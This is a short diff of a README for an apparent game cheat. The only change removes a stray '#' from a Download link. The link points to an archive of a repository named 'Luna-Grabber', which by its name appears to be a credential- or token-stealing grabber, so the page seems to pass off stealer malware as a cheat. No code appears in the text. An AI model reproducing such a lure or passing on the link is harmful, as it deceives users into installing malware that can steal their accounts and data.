@@ -3,7 +3,7 @@
 </h1>
 
 ![](https://github.com/myxr9n/xenosware/blob/main/ignore.gif)
-#[Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip)
+[Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip)
 
 ## Usage
 *The cheat will **NOT** start if the game is not running.*
